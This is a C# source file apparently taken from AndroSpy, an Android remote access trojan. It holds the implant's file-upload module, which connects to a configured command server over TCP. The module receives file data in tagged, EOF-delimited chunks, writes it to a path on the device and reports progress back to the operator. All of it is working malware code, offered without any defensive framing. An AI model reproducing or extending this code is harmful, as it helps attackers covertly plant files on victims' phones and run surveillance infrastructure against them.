using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Task2
{
    public class Upload : IDisposable
    {
        private FileStream fs = default;
        private MemoryStream memos = default;
        private byte[] dataByte = new byte[1536000];
        private int blockSize = 1536000;
        private int maxlenght_ = default;
        private string dosyaismi = default;
        private string yol = default;
        private string aydi = default;
        private string pPath = default;
        private Socket socket = default;
        public Upload(string path, string filename, string maxlenght, string identification, string pcPath)
        {
            try
            {
                string fmane = path + "/" + filename;
                if (File.Exists(fmane)) { try { File.Delete(fmane); } catch { } }
                pPath = pcPath;
                aydi = identification;
                dosyaismi = filename;
                yol = path;
                maxlenght_ = int.Parse(maxlenght);
                memos = new MemoryStream();
                fs = new FileStream(path + "/" + filename, FileMode.Append);
                Socket tmps = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                tmps.ReceiveTimeout = -1; tmps.SendTimeout = -1;
                tmps.SendBufferSize = int.MaxValue;
                tmps.ReceiveBufferSize = int.MaxValue;
                tmps.NoDelay = true;
                IPAddress ipadresi_dosya = Dns.GetHostAddresses(MainValues.IP)[0];
                IPEndPoint endpoint_dosya = new IPEndPoint(ipadresi_dosya, MainValues.port);
                ((MainActivity)MainActivity.global_activity).SetKeepAlive(tmps, 2000, 1000);
                socket = tmps;
                
                tmps.Connect(endpoint_dosya);

                byte[] ayrinti = Encoding.UTF8.GetBytes(filename + "[VERI]" + "%0" + "[VERI]0 B/" + GetFileSizeInBytes(maxlenght_) + "[VERI]" + pcPath);
                byte[] hazirim = ((MainActivity)MainActivity.global_activity).MyDataPacker("UPLOAD", ayrinti, path + filename + "[ID]" + identification);
                tmps.Send(hazirim, 0, hazirim.Length, SocketFlags.None);
                tmps.BeginReceive(dataByte, 0, blockSize, SocketFlags.None, received, tmps);
            }
            catch (Exception)
            {
                CloseSockets();
            }
        }

        public async void received(IAsyncResult ar)
        {
            try
            {
                Socket scServer = (Socket)ar.AsyncState;
                int readed = scServer.EndReceive(ar);
                if (scServer != null && ((MainActivity)MainActivity.global_activity).upList.Contains(this))
                {// classic socket async result operation.
                    if (readed > 0)
                    {
                        if (memos != null)
                        {
                            memos.Write(dataByte, 0, readed); // write readed data to memorystream.
                            try
                            {
                                // give as param our memorystream to our byte[] splitter,
                                // and process the byte[] arrays as data buffer [byte[]], tag text [string] and extra infos [string]
                                await UnPacker(memos, scServer);
                            }
                            catch (Exception) { }
                        }
                    }
                    await Task.Delay(1); // reduce high cpu usage. :)
                    if (((MainActivity)MainActivity.global_activity).upList.Contains(this))
                    {
                        scServer.BeginReceive(dataByte, 0, blockSize, SocketFlags.None, received, scServer);
                    }
                }
                else
                {
                    CloseSockets();
                }
            }
            catch (Exception) { CloseSockets(); }

        }
        public async Task UnPacker(MemoryStream ms, Socket server)
        {
            //This unpacker coded by qH0sT' - 2021 - AndroSpy.
            //string letter = "qwertyuıopğüasdfghjklşizxcvbnmöç1234567890<>|";
            Regex regex = new Regex(@"<[A-Z]+>\|[0-9]+\|.*>");

            await Task.Run(() =>
            {
                byte[][] filebytes = Separate(ms.ToArray(), System.Text.Encoding.UTF8.GetBytes("SUFFIX"));
                for (int k = 0; k < filebytes.Length - 1; k++)
                {
                    if (server != null)
                    {
                        try
                        {
                            string ch = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 1] });// >
                            string f = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 2] });// F>
                            string o = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 3] });// OF>
                            string e = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 4] });// EOF>
                            string ch_ = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 5] });// <EOF>

                            bool isContainsEof = (ch_ + e + o + f + ch) == "<EOF>";
                            if (isContainsEof)
                            {
                                List<byte> mytagByte = new List<byte>();
                                string temp = "";
                                for (int p = 0; p < filebytes[k].Length; p++)
                                {
                                    //if (letter.Contains(Encoding.UTF8.GetString(new byte[1] { filebytes[k][p] }).ToLower()))
                                    //{
                                    temp += System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][p] });
                                    mytagByte.Add(filebytes[k][p]);
                                    if (regex.IsMatch(temp))
                                    {
                                        break;
                                    }
                                    //}
                                }
                                string whatsTag = System.Text.Encoding.UTF8.GetString(mytagByte.ToArray());

                                MemoryStream tmpMemory = new MemoryStream();
                                tmpMemory.Write(filebytes[k], 0, filebytes[k].Length);
                                tmpMemory.Write(System.Text.Encoding.UTF8.GetBytes("SUFFIX"), 0, System.Text.Encoding.UTF8.GetBytes("SUFFIX").Length);
                                ms.Flush();
                                ms.Close();
                                ms.Dispose();
                                ms = new MemoryStream(RemoveBytes(ms.ToArray(), tmpMemory.ToArray()));
                                memos = new MemoryStream();
                                ms.CopyTo(memos);
                                tmpMemory.Flush();
                                tmpMemory.Close();
                                tmpMemory.Dispose();
                                filebytes[k] = RemoveBytes(filebytes[k], mytagByte.ToArray());
                                filebytes[k] = RemoveBytes(filebytes[k], System.Text.Encoding.UTF8.GetBytes("<EOF>"));
                                if (((MainActivity)MainActivity.global_activity).upList.Contains(this))
                                {
                                    bilgial(whatsTag, filebytes[k], server);
                                }
                                else
                                {
                                    break;
                                }

                            }
                        }
                        catch (Exception) { }
                    }
                    else { CloseSockets(); break; }
                }
            });
        }

        public static byte[][] Separate(byte[] source, byte[] separator)
        {
            var Parts = new List<byte[]>();
            var Index = 0;
            byte[] Part;
            for (var I = 0; I < source.Length; ++I)
            {
                if (Equals(source, separator, I))
                {
                    Part = new byte[I - Index];
                    Array.Copy(source, Index, Part, 0, Part.Length);
                    Parts.Add(Part);
                    Index = I + separator.Length;
                    I += separator.Length - 1;
                }
            }
            Part = new byte[source.Length - Index];
            Array.Copy(source, Index, Part, 0, Part.Length);
            Parts.Add(Part);
            return Parts.ToArray();
        }
        static bool Equals(byte[] source, byte[] separator, int index)
        {
            for (int i = 0; i < separator.Length; ++i)
                if (index + i >= source.Length || source[index + i] != separator[i])
                    return false;
            return true;
        }
        public static byte[] RemoveBytes(byte[] input, byte[] pattern)
        {
            if (pattern.Length == 0) return input;
            var result = new List<byte>();
            for (int i = 0; i < input.Length; i++)
            {
                var patternLeft = i <= input.Length - pattern.Length;
                if (patternLeft && (!pattern.Where((t, j) => input[i + j] != t).Any()))
                {
                    i += pattern.Length - 1;
                }
                else
                {
                    result.Add(input[i]);
                }
            }
            return result.ToArray();
        }
        public void bilgial(string tag, byte[] dataBuff, Socket sckt)
        {
            switch (tag.Split('|')[0])
            {
                case "<UPLOADING>":
                    try
                    {
                        try
                        {
                            fs.Write(dataBuff, 0, dataBuff.Length);
                        }
                        catch { CloseSockets(); }
                        if (sckt != null)
                        {
                            decimal yuzde = fs.Length * 100 / maxlenght_;
                            string kbmb = GetFileSizeInBytes(fs.Length) + "/" + GetFileSizeInBytes(maxlenght_);

                            byte[] ayrinti = Encoding.UTF8.GetBytes(dosyaismi + "[VERI]" + "%" + yuzde.ToString() + "[VERI]" + kbmb + "[VERI]" + pPath);
                            byte[] hazirim = ((MainActivity)MainActivity.global_activity).MyDataPacker("UPLOAD", ayrinti, yol + dosyaismi + "[ID]" + aydi);
                            sckt.Send(hazirim, 0, hazirim.Length, SocketFlags.None);
                        }

                        if (fs != null)
                        {
                            if (fs.Length == maxlenght_)
                            {
                                CloseSockets();
                            }
                        }

                    }
                    catch (Exception) { CloseSockets(); }
                    break;
            }
        }
        public static string GetFileSizeInBytes(double sized)
        {
            try
            {
                string[] sizes = { "B", "KB", "MB", "GB", "TB" };
                double len = sized;
                int order = 0;
                while (len >= 1024 && order < sizes.Length - 1)
                {
                    order++;
                    len = len / 1024;
                }
                string result = string.Format("{0:0.##} {1}", len, sizes[order]);
                return result;
            }
            catch (Exception ex) { return ex.Message; }
        }
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }
        protected bool Disposed { get; private set; }
        protected virtual void Dispose(bool disposing)
        {
            Disposed = true;
        }
        public void CloseSockets()
        {
            try { ((MainActivity)MainActivity.global_activity).upList.Remove(this); } catch (Exception) { }
            if (socket != null)
            {
                try { socket.Close(); } catch (Exception) { }
                try { socket.Dispose(); } catch (Exception) { }
            }
            if (fs != null)
            {
                try { fs.Flush(); } catch { }
                try { fs.Close(); } catch { }
                try { fs.Dispose(); } catch { }
            }
            if (memos != null)
            {
                try { memos.Flush(); } catch { }
                try { memos.Close(); } catch { }
                try { memos.Dispose(); } catch { }
            }          
            try { Dispose(); } catch (Exception) { }
            GC.Collect();
        }
    }
}